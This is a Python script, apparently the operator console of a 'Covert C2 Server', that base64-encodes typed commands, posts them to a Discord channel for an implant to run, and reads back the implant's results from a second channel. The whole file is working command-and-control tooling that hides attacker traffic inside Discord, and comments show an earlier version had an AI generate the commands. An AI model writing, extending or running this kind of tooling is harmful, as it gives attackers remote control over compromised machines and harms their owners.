import requests
import json
import time
import base64 # <-- NEW: Import the built-in base64 library

# --- CONFIGURE THESE ---
DISCORD_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" # PASTE YOUR TOKEN
TASKING_CHANNEL_ID = "YOUR_TASKING_CHANNEL_ID_HERE"
RESULTS_CHANNEL_ID = "YOUR_RESULTS_CHANNEL_ID_HERE"
# OLLAMA_API_URL is no longer needed.
# -----------------------

DISCORD_API_URL = "https://discord.com/api/v10"
HEADERS = {
    "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
    "Content-Type": "application/json"
}

# --- AI FUNCTION REMOVED ---
# We no longer need get_ai_command()

def encode_command(task):
    """
    Encodes a command to base64 *locally* and *reliably*.
    """
    print(f"[+] Encoding task: {task}")
    try:
        # Convert the string to bytes, encode it, then convert back to a string
        task_bytes = task.encode('utf-8')
        payload_bytes = base64.b64encode(task_bytes)
        payload = payload_bytes.decode('utf-8')
        
        print(f"[+] Generated payload: {payload}")
        return payload
    except Exception as e:
        print(f"[!] Error encoding command: {e}")
        return None

def send_task(payload):
    url = f"{DISCORD_API_URL}/channels/{TASKING_CHANNEL_ID}/messages"
    data = {"content": payload}
    try:
        response = requests.post(url, headers=HEADERS, json=data)
        response.raise_for_status()
        print("[+] Task posted to C2 channel.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error posting to Discord: {e}")
        
def check_results():
    url = f"{DISCORD_API_URL}/channels/{RESULTS_CHANNEL_ID}/messages?limit=1"
    try:
        response = requests.get(url, headers=HEADERS)
        response.raise_for_status()
        messages = response.json()
        if messages:
            print(f"\n[+] Result received from implant:\n{'-'*30}\n{messages[0]['content']}\n{'-'*30}")
        else:
            print("\n[+] No results found yet.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error checking Discord results: {e}")

# --- Main C2 Loop ---
def main():
    print("--- Covert C2 Server (v6 - Local Encode) ---")
    print("Type 'check' to fetch last result. Type 'exit' to quit.")
    try:
        while True:
            task = input("C2> ")
            
            if task.lower() == 'exit':
                break
            
            if task.lower() == 'check':
                check_results()
                continue
            
            # 1. Get locally-encoded payload (no AI)
            payload = encode_command(task) 
            
            # 2. Send payload to C2 channel
            if payload:
                send_task(payload)
                
    except KeyboardInterrupt:
        print("\n[+] C2 Server shutting down. Goodbye.")

if __name__ == "__main__":
    main()
